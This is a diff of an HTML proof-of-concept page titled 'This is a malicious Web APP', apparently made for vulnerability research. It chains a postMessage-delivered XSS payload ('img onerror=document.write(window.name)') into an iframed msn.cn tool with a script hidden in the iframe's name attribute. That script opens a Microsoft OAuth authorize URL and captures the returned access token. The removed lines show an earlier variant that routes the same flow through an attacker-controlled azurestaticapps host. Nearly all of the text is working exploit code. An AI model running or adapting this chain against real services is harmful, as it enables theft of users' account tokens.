@@ -11,16 +11,17 @@
 <body>
   <main>
     <h1>This is a malicious Web APP</h1>
-    <button onclick="go()">go</button>
-    <div id="token"></div>
+    <iframe id="iframe" src="https://www.msn.cn/staticsb/statics/latest/content-tools/aecTool/aecTool.html" style="width:100%;height:100%;border:0" onload="sendPM()" name='<button onclick="go()">go</button><div id="token"></div><script>token=document.getElementById("token");onmessage=function(e){token.textContent="message received: " + e.data.data.result;
+ }
+ function go(){
+  window.open(`https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=f78b16b6-0f85-48c0-b19b-fcaa5da5dae2&tenant=common&redirect_uri=https%3A%2F%2Fwebxtsvc.microsoft.com%2Flogin&response_type=token&scope=https://cryptoservicemfa.webxtsvc.microsoft.com/Mainnet.Write&state={"parentOrigin":"https://www.msn.cn"}`,"_blank");
+ }
+ </script>
+ '></iframe>
   </main>
   <script>
-    token=document.getElementById('token');
-    onmessage=function(e){
-      token.textContent="message received: " + e.data.data.result;
-    }
-    function go(){
-      window.open('https://login.live.com/oauth20_authorize.srf?client_id=f78b16b6-0f85-48c0-b19b-fcaa5da5dae2&scope=service%3a%3ainstrumentExport.cp.microsoft.com%3a%3aHBI&redirect_uri=https%3a%2f%2fwebxtsvc.microsoft.com%2flogin&response_type=token&state={"parentOrigin":"https://victorious-smoke-01292eb10.3.azurestaticapps.net/.bing.com"}','_blank');//!!! Rewrite "your-server" to your host !!!
+    function sendPM(){
+      iframe.contentWindow.postMessage({"message":"convertAndLoad","json":'"{\\"_locale\\":\\"<img src=x onerror=document.write(window.name)>\\",\\"_id\\":\\"\\"}"'},'*');
     }
   </script>
 </body>
